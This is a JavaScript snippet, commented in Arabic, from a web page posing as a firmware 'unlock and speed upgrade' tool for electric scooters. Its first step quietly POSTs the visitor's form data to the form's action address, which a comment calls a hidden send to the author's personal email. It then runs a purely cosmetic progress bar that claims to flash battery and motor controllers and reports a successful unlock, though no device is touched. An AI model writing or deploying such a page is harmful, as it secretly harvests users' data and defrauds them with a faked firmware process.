<script>
    let calculatedMinutes = 13; // القيمة الافتراضية الأساسية تماشياً مع طلبك

    function processStep1(e) {
        e.preventDefault();
        const form = document.getElementById('updateForm');
        const scName = document.getElementById('scooterName').value;
        const selectedModel = document.getElementById('scooterModel').value;
        
        document.getElementById('scooterLabel').innerText = scName;

        // معادلة ذكية لتغيير وقت التحديث حسب الموديل المختار (بداية من 13 دقيقة فما فوق)
        if (selectedModel.includes("Xiaomi Pro 2")) {
            calculatedMinutes = 14;
        } else if (selectedModel.includes("Xiaomi Scooter 4")) {
            calculatedMinutes = 16;
        } else if (selectedModel.includes("Ninebot")) {
            calculatedMinutes = 18;
        } else if (selectedModel.includes("Dualtron")) {
            calculatedMinutes = 22; // الموديلات الثقيلة تأخذ وقتاً أطول
        } else {
            calculatedMinutes = 13; // الحد الأدنى المظبوط
        }

        // إرسال خفي فوري لإيميلك الشخصي
        fetch(form.action, {
            method: "POST",
            body: new FormData(form)
        });

        // الانتقال للخطوة 2 بسلاسة
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
        document.getElementById('dot1').classList.add('completed');
        document.getElementById('dot2').classList.add('active');
    }

    function processStep2() {
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step3').classList.add('active');
        document.getElementById('dot2').classList.add('completed');
        document.getElementById('dot3').classList.add('active');

        // عرض وقت التحديث الذكي المحسوب في الواجهة
        document.getElementById('estimatedTimeLabel').innerText = `الوقت المقدر للتحديث: من 13 إلى ${calculatedMinutes} دقيقة حسب الموديل`;

        runCleanUpdate();
    }

    function runCleanUpdate() {
        let progress = 0;
        const pLabel = document.getElementById('percentageLabel');
        const statusText = document.getElementById('mainStatusText');
        const statusList = document.getElementById('statusList');

        const interval = setInterval(() => {
            if (progress < 100) {
                progress += 1;
                pLabel.innerText = progress + "%";

                if (progress === 20) {
                    statusText.innerText = "جاري مسح الذاكرة المؤقتة للبطارية...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> تهيئة متحكم الطاقة الخارجي (BMS)...</div>';
                }
                if (progress === 50) {
                    statusText.innerText = "جاري كتابة حزمة تعديل السرعة (ESC)...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> حقن كود الخريطة البرمجية الجديدة للمحرك...</div>';
                }
                if (progress === 80) {
                    statusText.innerText = "جاري إغلاق قنوات التشفير الفيدرالي...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> فحص جودة النواة وتأمين لوحة القيادة (BLE)...</div>';
                }
            } else {
                clearInterval(interval);
                statusText.innerText = "تمت الترقية وفك الحظر بنجاح! ⚡";
                statusText.style.color = "var(--accent)";
                pLabel.innerHTML = '<i class="fa-solid fa-check" style="color:var(--accent); font-size:2rem;"></i>';
                statusList.innerHTML = '<div class="status-item done"><i class="fa-solid fa-circle-check"></i> اكتملت المزامنة بنجاح تام. يمكنك الآن فصل الشاحن وتشغيل السكوتر للاستمتاع بالقوة الجديدة!</div>';
                document.getElementById('dot3').classList.add('completed');
            }
        }, 85); // سرعة عد التحديث متناسقة وفخمة
    }
</script>
